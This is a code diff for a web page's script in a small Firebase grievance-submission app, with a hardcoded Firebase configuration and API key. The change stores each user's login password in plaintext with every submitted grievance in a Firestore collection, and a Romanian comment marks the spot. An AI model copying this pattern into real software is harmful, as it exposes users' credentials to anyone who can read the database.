@@ -76,7 +76,7 @@
   </div>
 
   <script>
-    // ✅ Firebase Config - this is correct
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyDDOtT_92PAgbiEdztUKrMthVqow9nGFbg",
       authDomain: "ceicarestiu-b5e76.firebaseapp.com",
@@ -87,11 +87,12 @@
       measurementId: "G-J9DYQF0W8S"
     };
 
-    // ✅ Initialize Firebase (using compat SDK)
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
     let currentUser = '';
+    let currentPassword = '';
 
     function login() {
       const username = document.getElementById('username').value;
@@ -99,6 +100,7 @@
 
       if (username && password) {
         currentUser = username;
+        currentPassword = password;
         document.getElementById('user-name').textContent = username;
         document.getElementById('login-screen').style.display = 'none';
         document.getElementById('welcome-screen').style.display = 'block';
@@ -113,6 +115,7 @@
       if (text) {
         db.collection('grievances').add({
           username: currentUser,
+          password: currentPassword, // 🔐 parola salvată aici
           message: text,
           timestamp: new Date()
         }).then(() => {
